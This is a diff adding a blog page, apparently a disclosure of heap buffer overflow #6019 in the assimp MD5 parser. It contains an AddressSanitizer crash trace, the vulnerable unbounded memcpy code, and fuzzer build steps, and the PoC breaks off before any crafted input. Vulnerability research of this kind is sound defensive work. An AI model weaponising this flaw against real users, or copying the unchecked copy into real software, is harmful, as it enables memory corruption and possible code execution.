@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Heap Overflow in assimp - Arzedlab 🪵</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="A detailed breakdown of a heap overflow in the assimp library triggered by malformed model files. The post walks through code paths, root cause analysis, and practical exploitation considerations." />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/heap-overflow-%236019-1cc3648c0bf480caa958ecd9ef36c0f4/">
+  <meta property="og:site_name" content="Arzedlab 🪵">
+  <meta property="og:title" content="Heap Overflow in assimp">
+  <meta property="og:description" content="A detailed breakdown of a heap overflow in the assimp library triggered by malformed model files. The post walks through code paths, root cause analysis, and practical exploitation considerations.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-04-05T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-04-05T00:00:00+00:00">
+    <meta property="article:tag" content="Heap-Overflow">
+    <meta property="article:tag" content="Assimp">
+    <meta property="article:tag" content="Memory">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Heap Overflow in assimp">
+  <meta name="twitter:description" content="A detailed breakdown of a heap overflow in the assimp library triggered by malformed model files. The post walks through code paths, root cause analysis, and practical exploitation considerations.">
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />
+
+	
+	
+
+	
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Arzedlab 🪵</a>
+	</div>
+	<nav>
+		
+		<a href="/">🏠 Home</a>
+		
+		<a href="/posts">🗂️ All posts</a>
+		
+		<a href="/about">💡 About Me</a>
+		
+		<a href="/papers">📑 Publications</a>
+		
+		<a href="/tags">🏷️ Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Heap Overflow in assimp</h1>
+			<div class="meta">Posted on Apr 5, 2024</div>
+		</div>
+		
+
+		
+		<div class="toc">
+		<strong>Table of contents:</strong>
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#bug-heap-based-buffer-overflow-in-ai_"><strong>Bug: Heap-based Buffer Overflow in AI_MD5_PARSE_STRING_IN_QUOTATION</strong></a>
+      <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#acid-flow">ACID FLOW</a></li>
+        <li><a href="#affected">Affected</a></li>
+        <li><a href="#details">Details</a></li>
+        <li><a href="#poc">PoC</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+		</div>
+
+		<section class="body">
+			<h1 id="heap-overflow-6019">Heap Overflow #6019</h1>
+<h2 id="bug-heap-based-buffer-overflow-in-ai_"><strong>Bug: Heap-based Buffer Overflow in AI_MD5_PARSE_STRING_IN_QUOTATION</strong></h2>
+<p>Source: <a href="https://github.com/assimp/assimp/issues/6019">https://github.com/assimp/assimp/issues/6019</a></p>
+<h3 id="summary">Summary</h3>
+<p>heap buffer overflow in <code>AI_MD5_PARSE_STRING_IN_QUOTATION</code>. An attacker could potentially exploit the vulnerability to cause a remote code execution, if they can trick the victim into running assimp on a malformed MD5 file.</p>
+<p>Heap Overflow was caused by function <code>memcpy</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>MEMCPY(3)                                                                                                                                              Linux Programmer&#39;s Manual                                                                                                                                             MEMCPY(3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NAME
+</span></span><span style="display:flex;"><span>       memcpy - copy memory area
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SYNOPSIS
+</span></span><span style="display:flex;"><span>       #include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       void *memcpy(void *dest, const void *src, size_t n);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DESCRIPTION
+</span></span><span style="display:flex;"><span>       The memcpy() function copies n bytes from memory area src to memory area dest.  The memory areas must not overlap.  Use memmove(3) if the memory areas do overlap.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RETURN VALUE
+</span></span><span style="display:flex;"><span>       The memcpy() function returns a pointer to dest.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ATTRIBUTES
+</span></span><span style="display:flex;"><span>       For an explanation of the terms used in this section, see attributes(7).
+</span></span></code></pre></div><h3 id="acid-flow">ACID FLOW</h3>
+<p>ASAN giving heap overflow error in fucntion AI_MD5_PARSE_STRING_IN_QUOTATION</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">==</span><span style="color:#8be9fd;font-style:italic">78753</span><span style="color:#ff79c6">==</span>ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000018300 at pc 0x58950c234ba3 bp 0x7ffe08a2d9d0 sp 0x7ffe08a2d198
+</span></span><span style="display:flex;"><span>WRITE of size <span style="color:#bd93f9">16415</span> at 0x629000018300 thread T0
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#0 0x58950c234ba2 in __interceptor_memcpy (/home/capstone/research/assimp/assimp_fuzzer+0x17aba2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#1 0x58950c4ab9d1 in AI_MD5_PARSE_STRING_IN_QUOTATION(char const**, char const*, aiString&amp;) (/home/capstone/research/assimp/assimp_fuzzer+0x3f19d1) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#2 0x58950c4aa9e5 in Assimp::MD5::MD5AnimParser::MD5AnimParser(std::vector&lt;Assimp::MD5::Section, std::allocator&lt;Assimp::MD5::Section&gt; &gt;&amp;) (/home/capstone/research/assimp/assimp_fuzzer+0x3f09e5) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#3 0x58950c4a355e in Assimp::MD5Importer::LoadMD5AnimFile() (/home/capstone/research/assimp/assimp_fuzzer+0x3e955e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#4 0x58950c4a0578 in Assimp::MD5Importer::InternReadFile(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, aiScene*, Assimp::IOSystem*) (/home/capstone/research/assimp/assimp_fuzzer+0x3e6578) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#5 0x58950caca48e in Assimp::BaseImporter::ReadFile(Assimp::Importer*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, Assimp::IOSystem*) (/home/capstone/research/assimp/assimp_fuzzer+0xa1048e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#6 0x58950c2fd30d in Assimp::Importer::ReadFile(char const*, unsigned int) (/home/capstone/research/assimp/assimp_fuzzer+0x24330d) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#7 0x58950c2fc3a9 in Assimp::Importer::ReadFileFromMemory(void const*, unsigned long, unsigned int, char const*) (/home/capstone/research/assimp/assimp_fuzzer+0x2423a9) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#8 0x58950c2d85a2 in LLVMFuzzerTestOneInput (/home/capstone/research/assimp/assimp_fuzzer+0x21e5a2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#9 0x58950c200fe3 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x146fe3) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#10 0x58950c1ead5f in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x130d5f) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#11 0x58950c1f0ab6 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/capstone/research/assimp/assimp_fuzzer+0x136ab6) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#12 0x58950c21a8d2 in main (/home/capstone/research/assimp/assimp_fuzzer+0x1608d2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#13 0x7f8750629d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#14 0x7f8750629e3f in __libc_start_main csu/../csu/libc-start.c:392:3</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#15 0x58950c1e5624 in _start (/home/capstone/research/assimp/assimp_fuzzer+0x12b624) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x629000018300 is located <span style="color:#bd93f9">0</span> bytes to the right of 16640-byte region <span style="color:#ff79c6">[</span>0x629000014200,0x629000018300<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>allocated by thread T0 here:
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#0 0x58950c29d65e in malloc (/home/capstone/research/assimp/assimp_fuzzer+0x1e365e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#1 0x7f8750ab751b in operator new(unsigned long) (/usr/lib/x86_64-linux-gnu/libstdc++.so.6+0xb751b) (BuildId: 2db998bd67acbfb235c464c0275d4070061695fb)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#2 0x58950c4b1630 in std::allocator_traits&lt;std::allocator&lt;Assimp::MD5::AnimBoneDesc&gt; &gt;::allocate(std::allocator&lt;Assimp::MD5::AnimBoneDesc&gt;&amp;, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x3f7630) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#3 0x58950c4b07a7 in std::_Vector_base&lt;Assimp::MD5::AnimBoneDesc, std::allocator&lt;Assimp::MD5::AnimBoneDesc&gt; &gt;::_M_allocate(unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x3f67a7) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#4 0x58950c4ae7be in void std::vector&lt;Assimp::MD5::AnimBoneDesc, std::allocator&lt;Assimp::MD5::AnimBoneDesc&gt; &gt;::_M_realloc_insert&lt;&gt;(__gnu_cxx::__normal_iterator&lt;Assimp::MD5::AnimBoneDesc*, std::vector&lt;Assimp::MD5::AnimBoneDesc, std::allocator&lt;Assimp::MD5::AnimBoneDesc&gt; &gt; &gt;) (/home/capstone/research/assimp/assimp_fuzzer+0x3f47be) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#5 0x58950c4ac9b0 in Assimp::MD5::AnimBoneDesc&amp; std::vector&lt;Assimp::MD5::AnimBoneDesc, std::allocator&lt;Assimp::MD5::AnimBoneDesc&gt; &gt;::emplace_back&lt;&gt;() (/home/capstone/research/assimp/assimp_fuzzer+0x3f29b0) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#6 0x58950c4aa9a8 in Assimp::MD5::MD5AnimParser::MD5AnimParser(std::vector&lt;Assimp::MD5::Section, std::allocator&lt;Assimp::MD5::Section&gt; &gt;&amp;) (/home/capstone/research/assimp/assimp_fuzzer+0x3f09a8) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#7 0x58950c4a355e in Assimp::MD5Importer::LoadMD5AnimFile() (/home/capstone/research/assimp/assimp_fuzzer+0x3e955e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#8 0x58950c4a0578 in Assimp::MD5Importer::InternReadFile(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, aiScene*, Assimp::IOSystem*) (/home/capstone/research/assimp/assimp_fuzzer+0x3e6578) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#9 0x58950caca48e in Assimp::BaseImporter::ReadFile(Assimp::Importer*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, Assimp::IOSystem*) (/home/capstone/research/assimp/assimp_fuzzer+0xa1048e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#10 0x58950c2fd30d in Assimp::Importer::ReadFile(char const*, unsigned int) (/home/capstone/research/assimp/assimp_fuzzer+0x24330d) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#11 0x58950c2fc3a9 in Assimp::Importer::ReadFileFromMemory(void const*, unsigned long, unsigned int, char const*) (/home/capstone/research/assimp/assimp_fuzzer+0x2423a9) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#12 0x58950c2d85a2 in LLVMFuzzerTestOneInput (/home/capstone/research/assimp/assimp_fuzzer+0x21e5a2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#13 0x58950c200fe3 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x146fe3) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#14 0x58950c1ead5f in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x130d5f) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#15 0x58950c1f0ab6 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/capstone/research/assimp/assimp_fuzzer+0x136ab6) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#16 0x58950c21a8d2 in main (/home/capstone/research/assimp/assimp_fuzzer+0x1608d2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#17 0x7f8750629d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SUMMARY: AddressSanitizer: heap-buffer-overflow <span style="color:#ff79c6">(</span>/home/capstone/research/assimp/assimp_fuzzer+0x17aba2<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">(</span>BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49<span style="color:#ff79c6">)</span> in __interceptor_memcpy
+</span></span><span style="display:flex;"><span>Shadow bytes around the buggy address:
+</span></span><span style="display:flex;"><span>  0x0c527fffb010: <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>
+</span></span><span style="display:flex;"><span>  0x0c527fffb020: <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>
+</span></span><span style="display:flex;"><span>  0x0c527fffb030: <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>
+</span></span><span style="display:flex;"><span>  0x0c527fffb040: <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>
+</span></span><span style="display:flex;"><span>  0x0c527fffb050: <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#8be9fd;font-style:italic">00</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">=</span>&gt;0x0c527fffb060:<span style="color:#ff79c6">[</span>fa<span style="color:#ff79c6">]</span>fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span style="display:flex;"><span>  0x0c527fffb070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span style="display:flex;"><span>  0x0c527fffb080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span style="display:flex;"><span>  0x0c527fffb090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span style="display:flex;"><span>  0x0c527fffb0a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span style="display:flex;"><span>  0x0c527fffb0b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span style="display:flex;"><span>Shadow byte legend <span style="color:#ff79c6">(</span>one shadow byte represents <span style="color:#bd93f9">8</span> application bytes<span style="color:#ff79c6">)</span>:
+</span></span><span style="display:flex;"><span>  Addressable:           <span style="color:#bd93f9">00</span>
+</span></span><span style="display:flex;"><span>  Partially addressable: <span style="color:#bd93f9">01</span> <span style="color:#bd93f9">02</span> <span style="color:#bd93f9">03</span> <span style="color:#bd93f9">04</span> <span style="color:#bd93f9">05</span> <span style="color:#bd93f9">06</span> <span style="color:#bd93f9">07</span> 
+</span></span><span style="display:flex;"><span>  Heap left redzone:       fa
+</span></span><span style="display:flex;"><span>  Freed heap region:       fd
+</span></span><span style="display:flex;"><span>  Stack left redzone:      f1
+</span></span><span style="display:flex;"><span>  Stack mid redzone:       f2
+</span></span><span style="display:flex;"><span>  Stack right redzone:     f3
+</span></span><span style="display:flex;"><span>  Stack after <span style="color:#ff79c6">return</span>:      f5
+</span></span><span style="display:flex;"><span>  Stack use after scope:   f8
+</span></span><span style="display:flex;"><span>  Global redzone:          f9
+</span></span><span style="display:flex;"><span>  Global init order:       f6
+</span></span><span style="display:flex;"><span>  Poisoned by user:        f7
+</span></span><span style="display:flex;"><span>  Container overflow:      <span style="color:#8be9fd;font-style:italic">fc</span>
+</span></span><span style="display:flex;"><span>  Array cookie:            ac
+</span></span><span style="display:flex;"><span>  Intra object redzone:    bb
+</span></span><span style="display:flex;"><span>  ASan internal:           fe
+</span></span><span style="display:flex;"><span>  Left alloca redzone:     ca
+</span></span><span style="display:flex;"><span>  Right alloca redzone:    cb
+</span></span></code></pre></div><h3 id="affected">Affected</h3>
+<p>assimp&gt;=5.4.3</p>
+<h3 id="details">Details</h3>
+<p>aiString is struct that has 1024 size of array <code>data</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>struct aiString <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    /** Binary length of the string excluding the terminal 0. This is NOT the
+</span></span><span style="display:flex;"><span>     *  logical length of strings containing UTF-8 multi-byte sequences! It&#39;s
+</span></span><span style="display:flex;"><span>     *  the number of bytes from the beginning of the string to its end.*/
+</span></span><span style="display:flex;"><span>    ai_uint32 length;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    /** String buffer. Size limit is AI_MAXLEN */
+</span></span><span style="display:flex;"><span>    char data<span style="color:#ff79c6">[</span>AI_MAXLEN<span style="color:#ff79c6">]</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>; // !struct aiString
+</span></span></code></pre></div><p>In <code>code/AssetLib/MD5/MD5Parser.cpp:302</code>, it does not validate the boundary of <code>sz</code>. Therefore, attacker can write arbitrary data and size that they want to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>// parse a string, enclosed in quotation marks
+</span></span><span style="display:flex;"><span>inline void AI_MD5_PARSE_STRING_IN_QUOTATION<span style="color:#ff79c6">(</span>const char **sz, const char *bufferEnd, aiString &amp;out<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    out.length <span style="color:#ff79c6">=</span> 0u;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">((</span><span style="color:#f1fa8c">&#39;\&#34;&#39;</span> !<span style="color:#ff79c6">=</span> **sz <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#f1fa8c">&#39;\0&#39;</span> !<span style="color:#ff79c6">=</span> **sz<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">&amp;&amp;</span> *sz !<span style="color:#ff79c6">=</span> bufferEnd<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        ++*sz;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;\0&#39;</span> !<span style="color:#ff79c6">=</span> **sz<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        const char *szStart <span style="color:#ff79c6">=</span> ++<span style="color:#ff79c6">(</span>*sz<span style="color:#ff79c6">)</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">((</span><span style="color:#f1fa8c">&#39;\&#34;&#39;</span> !<span style="color:#ff79c6">=</span> **sz <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#f1fa8c">&#39;\0&#39;</span> !<span style="color:#ff79c6">=</span> **sz<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">&amp;&amp;</span> *sz !<span style="color:#ff79c6">=</span> bufferEnd<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            ++*sz;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;\0&#39;</span> !<span style="color:#ff79c6">=</span> **sz<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            const char *szEnd <span style="color:#ff79c6">=</span> *sz;
+</span></span><span style="display:flex;"><span>            ++*sz;
+</span></span><span style="display:flex;"><span>            out.length <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>ai_uint32<span style="color:#ff79c6">)(</span>szEnd - szStart<span style="color:#ff79c6">)</span>;
+</span></span><span style="display:flex;"><span>            ::memcpy<span style="color:#ff79c6">(</span>out.data, szStart, out.length<span style="color:#ff79c6">)</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    out.data<span style="color:#ff79c6">[</span>out.length<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><h3 id="poc">PoC</h3>
+<ol>
+<li>build assimp with sanitizer</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/assimp/assimp.git <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">cd</span> assimp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cmake CMakeLists.txt -G <span style="color:#f1fa8c">&#34;Ninja&#34;</span> -DBUILD_SHARED_LIBS<span style="color:#ff79c6">=</span>OFF -DASSIMP_BUILD_ZLIB<span style="color:#ff79c6">=</span>ON <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>                    -DASSIMP_BUILD_TESTS<span style="color:#ff79c6">=</span>OFF -DASSIMP_BUILD_ASSIMP_TOOLS<span style="color:#ff79c6">=</span>OFF <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>                    -DASSIMP_BUILD_SAMPLES<span style="color:#ff79c6">=</span>OFF
+</span></span><span style="display:flex;"><span>cmake --build .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>clang -fsanitize<span style="color:#ff79c6">=</span>address,fuzzer -std<span style="color:#ff79c6">=</span>c++11 -Iinclude fuzz/assimp_fuzzer.cc -o assimp_fuzzer ./lib/libassimp.a ./contrib/zlib/libzlibstatic.a
+</span></span></code></pre></div><ol>
+<li>run fuzzer to trigger bug</li>
+</ol>
